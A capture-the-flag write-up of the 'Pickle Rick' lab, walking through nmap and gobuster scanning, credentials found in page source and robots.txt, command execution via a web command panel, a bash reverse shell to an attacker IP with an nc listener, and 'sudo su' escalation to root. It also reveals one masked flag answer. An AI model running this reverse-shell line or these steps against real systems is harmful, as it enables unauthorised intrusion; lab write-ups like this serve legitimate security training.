# Pickle Rick
### Difficulty: Easy

This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.

Deploy the virtual machine on this task and explore the web application: MACHINE_IP

## Answer the questions below
+ What is the first ingredient that Rick needs? `**. ******* ****`
+ What is the second ingredient in Rick’s potion? `* ***** ****`
+ What is the last and final ingredient? `***** *****`

### 1. Information Gathering
```bash
nmap -sC -sV 10.201.23.118 -oN nmap_picklerock

Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 19:08 WIB
Nmap scan report for 10.201.23.118
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5e:dd:58:36:ec:40:52:d7:27:01:33:a6:81:9c:84:7c (RSA)
|   256 9c:51:59:79:1e:92:f2:02:5f:02:ec:0e:5f:8f:f3:64 (ECDSA)
|_  256 9c:19:00:53:56:aa:c9:35:a3:ce:1f:15:32:63:28:a4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.96 seconds
```
Inspect web found
```html
  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```
#### Gobuster Directory Enumeration
```bash
gobuster dir -u http://10.201.23.118 \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt \
-t 50 -x php,txt,html

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.23.118
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/login.php            (Status: 200) [Size: 882]
/index.html           (Status: 200) [Size: 1062]
/assets               (Status: 301) [Size: 315] [--> http://10.201.23.118/assets/]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
/robots.txt           (Status: 200) [Size: 17]
```
Checking `robots.txt` return `Wubbalubbadubdub`

### 2. Initial Web Exploitation
After that, we go to the `http://10.201.23.118/portal.php` page and enter the username and the return result `R1ckRul3s` `Wubbalubbadubdub` later we will enter the page with the command panel form, there we `ls -la`

```bash

total 40
drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
```

Next, in the command panel, we enter `grep " " Sup3rS3cretPickl3Ingred.txt`
```bash
**. ******* ****
```

Using command `grep " " *.txt`
```bash
Sup3rS3cretPickl3Ingred.txt:mr. meeseek hair
clue.txt:Look around the file system for the other ingredient.
```
### 3. Discover Second Ingredient
`ls -la /home`
```bash
total 16
drwxr-xr-x  4 root   root   4096 Feb 10  2019 .
drwxr-xr-x 23 root   root   4096 Sep 11 12:07 ..
drwxrwxrwx  2 root   root   4096 Feb 10  2019 rick
drwxr-xr-x  5 ubuntu ubuntu 4096 Jul 11  2024 ubuntu
```
`ls -la /home/rick`
```bash
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
```
#### Payload executed in portal command panel:
Using Bash RevShell `/bin/bash -c "bash -i >& /dev/tcp/10.9.1.226/1337 0>&1"`

#### Listener on attack box:

In terminal bash `nc -lvnp 1337`
```bash
listening on [any] 1337 ...
connect to [10.9.1.226] from (UNKNOWN) [10.201.23.118] 40632
bash: cannot set terminal process group (1016): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-201-23-118:/var/www/html$ 
```
#### Connected reverse shell:
```bash
www-data@ip-10-201-23-118:/var/www/html$ cat /home/rick/second\ ingredients
x`
cat /home/rick/second\ ingredients
* ***** ****
```
## 4. Privilege Escalation

```bash
www-data@ip-10-201-23-118:/var/www/html$ sudo su
root@ip-10-201-23-118:/var/www/html# 
root@ip-10-201-23-118:/var/www/html# whoami
root
```
## 5. Final Ingredient
`Letsgoooo searching root!!`
```bash
root@ip-10-201-23-118:/var/www/html# ls /root
3rd.txt  snap
root@ip-10-201-23-118:/var/www/html# cat /root/3rd.txt
3rd ingredients: ***** *****
root@ip-10-201-23-118:/var/www/html# 

```



